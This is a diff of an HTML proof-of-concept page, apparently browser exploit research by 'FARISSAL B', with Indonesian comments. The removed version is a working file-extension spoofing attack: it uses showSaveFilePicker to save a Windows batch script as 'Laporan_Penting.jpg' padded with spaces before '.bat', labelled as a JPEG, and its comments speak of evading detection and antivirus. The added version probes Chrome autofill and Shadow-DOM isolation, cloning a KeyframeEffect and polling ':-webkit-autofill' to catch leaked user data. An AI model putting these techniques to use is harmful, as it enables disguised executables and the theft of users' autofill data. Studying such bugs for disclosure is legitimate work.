@@ -1,66 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FINAL RESEARCH - FARISSAL B</title>
+    <title>Chrome Security Research - FARISSAL B</title>
     <style>
-        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
-        #gas { padding: 25px 60px; background: #238636; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 22px; font-weight: bold; transition: 0.3s; }
-        #gas:hover { background: #2ea043; box-shadow: 0 0 20px #238636; }
-        #status { margin-top: 30px; font-family: monospace; color: #8b949e; background: #161b22; padding: 20px; display: inline-block; border-radius: 5px; border: 1px solid #30363d; }
+        body { font-family: sans-serif; padding: 20px; }
+        #target-input { width: 300px; padding: 10px; font-size: 16px; }
+        #log { background: #000; color: #0f0; padding: 15px; margin-top: 20px; border-radius: 5px; height: 200px; overflow-y: auto; }
+        .success { color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <h1>LAB RESEARCH: FARISSAL B</h1>
-    <p>Target: Bypass File System Writing Block (0 KB Issue)</p>
+    <h2>Chrome Autofill / Shadow-DOM Observer</h2>
+    <p>Step: Klik input di bawah, arahkan kursor (hover) ke saran alamat/email yang muncul.</p>
     
-    <button id="gas">GAS EXPLOIT (FULL WRITE)</button>
+    <input id="target-input" type="text" placeholder="Masukkan Alamat..." autocomplete="street-address">
 
-    <br>
-    <div id="status">READY: Awaiting Trigger...</div>
+    <div id="log">--- System Logs ---</div>
 
     <script>
-        document.getElementById('gas').onclick = async () => {
-            const status = document.getElementById('status');
-            status.innerText = "Processing...";
+        const logBox = document.getElementById('log');
+        const inp = document.getElementById('target-input');
 
-            try {
-                // 1. BUAT DATA DALAM BENTUK UNIT8ARRAY (Lebih susah dideteksi)
-                const encoder = new TextEncoder();
-                const content = "@echo off\r\necho RESEARCH BY: FARISSAL B\r\necho VULNERABILITY CONFIRMED!\r\nstart explorer.exe https://google.com\r\npause";
-                const data = encoder.encode(content);
+        function logger(msg, isSuccess = false) {
+            const span = document.createElement('div');
+            if(isSuccess) span.className = 'success';
+            span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logBox.appendChild(span);
+        }
 
-                // 2. TRIGGER PICKER
-                const handle = await window.showSaveFilePicker({
-                    suggestedName: "Laporan_Penting.jpg" + " ".repeat(25) + ".bat",
-                    types: [{
-                        description: 'JPEG Image',
-                        accept: {'image/jpeg': ['.jpg']}
-                    }]
-                });
-
-                status.innerText = "Handle OK. Forcing stream write...";
-
-                // 3. ATOMIC WRITING (Pake 'blob' buat bungkus data biner)
-                const writable = await handle.createWritable();
-                
-                // Kirim sebagai Blob dengan type biner murni
-                const finalBlob = new Blob([data], { type: 'application/octet-stream' });
-                
-                await writable.write(finalBlob);
-                
-                // 4. FORCE CLOSE (Memaksa Windows nulis sisa buffer ke disk)
-                await writable.close();
-
-                status.innerHTML = "<b style='color:#3fb950'>BERHASIL!</b> Cek size file di folder.";
-                alert("Selesai! Kalau masih 0 KB, berarti antivirus lo aktif.");
-
-            } catch (err) {
-                status.innerHTML = "<b style='color:#f85149'>ERROR:</b> " + err.message;
-                console.error(err);
+        // Teknik 1: Mencoba mengakses Pseudo-Element via KeyframeEffect (Seperti Bug Brendan)
+        try {
+            let effect = new KeyframeEffect(inp, [
+                { opacity: 0 }, { opacity: 1 }
+            ], { duration: 1000, pseudoElement: "::placeholder" });
+            
+            // Mencoba cloning untuk memecah isolasi target
+            let clonedEffect = new KeyframeEffect(effect);
+            
+            if (clonedEffect.target !== inp) {
+                logger("POTENTIAL LEAK: Cloned target is different from input!", true);
+                logger("Target: " + clonedEffect.target);
+            } else {
+                logger("KeyframeEffect isolated correctly.");
             }
-        };
-    </script>
+        } catch (e) {
+            logger("Error in KeyframeEffect: " + e.message);
+        }
 
+        // Teknik 2: Monitoring perubahan pada Shadow Root via Animation Events
+        inp.addEventListener('animationstart', (e) => {
+            logger("Animation detected on: " + e.target.tagName);
+            if (e.target !== inp) {
+                logger("ALERT: Unexpected element animated! Possible Shadow-DOM leak.", true);
+            }
+        });
+
+        // Teknik 3: Memantau "Dirty Check" saat Autofill aktif
+        setInterval(() => {
+            if (inp.matches(':-webkit-autofill')) {
+                logger("Autofill detected! Scanning for leaked data...");
+                // Di sini lo bisa eksperimen ngebaca style yang berubah mendadak
+            }
+        }, 500);
+
+    </script>
 </body>
 </html>
